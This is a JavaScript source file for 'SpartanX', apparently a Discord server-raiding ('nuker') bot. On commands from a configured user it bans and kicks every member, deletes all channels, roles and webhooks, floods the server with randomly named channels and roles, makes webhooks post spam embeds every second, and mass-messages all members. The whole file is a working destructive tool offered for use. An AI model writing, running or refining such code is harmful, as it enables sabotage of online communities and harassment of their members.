const { magentaBright, white, blackBright } = require('chalk');
const config = require('./config.json');
const { Client, EmbedBuilder, GatewayIntentBits } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.MessageContent,
    ]
});

process.title = '[SpartanX] - Loading..'

client.once('ready', async () => {	
    try { 
        var lietnUser = await client.users.fetch(config.dev_id).then(u => u.tag); 
    } catch (e) { 
        //
    };

    process.title = `[SpartanX] - Connected ${lietnUser}`
    console.log(` `);
    console.log(` `);
    console.log(white('                               #####  ####### #     # #       #######  #####  '));
    console.log(white('                              #     #    #     #   #  #       #       #     # '));
    console.log(blackBright('                              #          #      # #   #       #       #       '));
    console.log(blackBright('                               #####     #       #    #       #####    #####  '));
    console.log(magentaBright('                                    #    #       #    #       #             # '));
    console.log(magentaBright('                              #     #    #       #    #       #       #     # '));
    console.log(magentaBright('                               #####     #       #    ####### #######  #####  '));
    console.log(` `);
    console.log(` `);
    console.log(magentaBright(' [') + white('?') + magentaBright(']') + white(` Listening for`) + magentaBright(': ') + white(lietnUser));
});

const fs = require('fs');

client.on('rateLimit', () => {
    console.log("[+++] THE IP BEING RATELIMIT!!!!!!");
});

client.on("messageCreate", async (message) => {
    if (message.author.id !== config.dev_id) return;
    if (!message.content.startsWith(config.prefix)) return;

    const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
    const command = args.shift().toLocaleLowerCase();

    if (command === 'b' || command === 'ban') {
        // Ban Members
        Ban(message);
    }

    if (command === 'kick' || command === 'k') {
        // Kick Members
        Kick(message);
    };

    if (command === 'dm') {
        // Kick Members
        Direct(message, args[0]);
    };

    if (command === 'nuke') {
        // Delete Channels + Webhooks + Roles
        Delete(message);
        DeleteWebhook(message);
        // Create Channels + Webhooks + Roles + Send Messages
        Create(message);
    };
});

client.login(config.token);



async function Ban(message) { // Ban Members
    // Ban Members
    message.guild.members.fetch().then(m => {
        m.forEach(s => {
            s.ban({ user: m.user.id, reason: "Goodbye <3"}).then(() => {
                console.log('[-] Baned ', m.id)
            }).catch(() => {
                console.log('[+] Couldn\'t Baned', m.id)
            });
        })
    })
}

async function Kick(message) { // Delete Channels
    // Kick Members
    message.guild.members.fetch().then(m => {
        m.forEach(s => {
            s.kick({ user: m.user.id, reason: "Goodbye <3"}).then(() => {
                console.log('[-] Kicked ', m.id)
            }).catch(() => {
                console.log('[+] Couldn\'t Kicked', m.id)
            });
        })
    })
}

async function Delete(message) { // Delete Channels & Roles
    // Delete Channels
    message.guild.channels.fetch().then(c => {
        c.forEach(s => {
            s.delete().then(() => {
                console.log('[-] Deleted channel', s.id)
            }).catch(() => {
                console.log('[+] Couldn\'t delete channel', s.id)
            });
        })
    })
    // Delete Roles
    message.guild.roles.fetch().then(r => {
        r.forEach(s => {
            s.delete().then(() => {
                console.log('[-] Deleted role', s.id)
            }).catch(() => {
                console.log('[+] Couldn\'t delete role', s.id)
            });
        })
    })
}

async function Create(message) { // Create Channels & Roles

    // Create Channels
    for (let i = 0; i < config.amount; i++) {
        message.guild.channels.create({
            type: 0,
            name: crypto.randomUUID(),
            topic: "Made By: Nanotect."
        }).then(c => {
            console.log('[+] Create Channel', c.id)
            // Create Webhook
            if(++i == config.amount) {
                Webhook(message);
            }
        }).catch(() => {
            console.log('[-] Couldn\'t Create Channel')
        });
    }

    // Create Roles
    for (let i = 0; i < config.amount; i++) {
        message.guild.roles.create({
            name: crypto.randomUUID(),
            color: "Random",
        }).then(c => {
            console.log('[+] Create Roles', c.id)
        }).catch(() => {
            console.log('[-] Couldn\'t Create Roles')
        });
    }
}

async function Webhook(message) { // Create Webhooks
    message.guild.channels.fetch().then(c => {
        c.forEach(s => {
            s.createWebhook({
                name: 'Test',
                avatar: 'https://i.imgur.com/AfFp7pu.png', 
            }).then(webhook => {
                console.log("[+] Created webhook", webhook.id);
                // Send Message
                SendWebhook(webhook);
            }).catch(() => {
                console.log('[-] Couldn\'t create webhook');
            });
        })
    })
}

async function SendWebhook(webhook) { // Send Messages
    setInterval(() => {
        const normal = fs.readFileSync('./messages/normal.txt', 'utf8');
        const description = fs.readFileSync('./messages/description.txt', 'utf8');
        const field = fs.readFileSync('./messages/field.txt', 'utf8');
        const footer = fs.readFileSync('./messages/footer.txt', 'utf8');
    
        const randomLinks = config.randomLinks;
    
        const embed = new EmbedBuilder()
            .setAuthor({ name: 'SpartanX', url: `${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`, iconURL: `${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`})
            .setColor("Random")
            .setTitle('SpartanX is best tool ever!')
            .setURL(`${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`)
            .setImage(`${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`)
            .setThumbnail(`${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`)
            .setDescription(description)
            .setFooter({ text: footer, iconURL: `${randomLinks[Math.floor(Math.random() * randomLinks.length)]}` })
            .addFields({ name: crypto.randomUUID(), value: field })
            .addFields({ name: crypto.randomUUID(), value: field })
            .addFields({ name: crypto.randomUUID(), value: field })
            .addFields({ name: crypto.randomUUID(), value: field })
            .setTimestamp();

        webhook.send({ content: normal, embeds: [embed] })
    }, 1000)
}

async function DeleteWebhook(message) { // Delete Webhooks
    message.guild.fetchWebhooks().then(r => {
        r.forEach(s => {
            s.delete().then(() => {
                console.log('[-] Deleted webhook', s.id)
            }).catch(() => {
                console.log('[+] Couldn\'t delete webhook', s.id)
            });
        })
    })
}

async function Direct(message, args) { // Direct Messages
    message.guild.members.fetch().then(m => {
        m.forEach(s => {
            // Check if bot!
            if(s.user.bot) return;

            s.send(args).then(() => {
                console.log('[-] Direct', s.id)
            }).catch(() => {
                console.log('[+] Couldn\'t Direct', s.id)
            });
        })
    })
}